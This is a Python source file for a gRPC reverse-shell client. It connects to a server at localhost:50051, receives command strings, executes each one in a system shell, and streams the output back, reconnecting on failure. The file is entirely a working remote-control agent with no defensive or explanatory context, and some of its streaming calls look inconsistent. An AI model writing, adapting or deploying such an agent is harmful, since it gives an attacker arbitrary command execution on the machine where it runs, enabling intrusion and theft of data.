import grpc
import reverse_shell_pb2
import reverse_shell_pb2_grpc
import subprocess
import asyncio
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', handlers=[logging.StreamHandler()])

class ReverseShellClient:
    def __init__(self):
        self.channel = None
        self.stub = None
        self.connected = False

    async def start(self):
        logging.info("Client start method initiated.")
        self.channel = grpc.aio.insecure_channel('localhost:50051')
        self.stub = reverse_shell_pb2_grpc.ReverseShellServiceStub(self.channel)

        while True:
            try:
                if not self.connected:
                    logging.info("Connecting to gRPC server...")
                    await self.connect_to_server()
                else:
                    logging.info("Requesting commands from server.")
                    async for command_request in self.stub.StartSession(iter([])):
                        command = command_request.output.strip()
                        logging.info(f"Received command from server: {command}")
                        if command:
                            async for output in self.execute_command(command):
                                response = reverse_shell_pb2.CommandResponse(
                                    request_id=command_request.request_id,
                                    output=output,
                                    is_active=True
                                )
                                # Stream responses to the server
                                async for _ in self.stub.StreamResponses(iter([response])):
                                    logging.info(f"Sent command output to server for command: {command}")

                            # After command execution is complete, send the final response with is_active=False
                            final_response = reverse_shell_pb2.CommandResponse(
                                request_id=command_request.request_id,
                                output="",
                                is_active=False
                            )
                            await self.stub.StreamResponses(iter([final_response]))
                            logging.info("Command processing finished.")
                        else:
                            logging.info("No command received; waiting for the next command.")
            except grpc.RpcError as e:
                logging.error(f"Error in receiving commands: {e.details()}")
                self.connected = False
            except Exception as e:
                logging.error(f"Unexpected error: {str(e)}")
            await asyncio.sleep(5)  # Retry after delay if disconnected


    async def connect_to_server(self):
        # Wait for the channel to be ready
        await self.channel.channel_ready()
        self.connected = True
        logging.info("Connected to gRPC server.")

    async def execute_command(self, command):
        logging.info(f"Executing command: {command}")
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        async for line in process.stdout:
            decoded_line = line.decode().strip()
            logging.info(f"Command stdout: {decoded_line}")
            yield decoded_line

        async for line in process.stderr:
            decoded_line = line.decode().strip()
            logging.info(f"Command stderr: {decoded_line}")
            yield decoded_line

        await process.wait()
        yield ''  # Send an empty response to indicate the command is finished

    async def close(self):
        if self.channel:
            await self.channel.close()

async def main():
    client = ReverseShellClient()
    try:
        await client.start()
    except KeyboardInterrupt:
        logging.info("Shutting down client.")
        await client.close()

if __name__ == "__main__":
    asyncio.run(main())
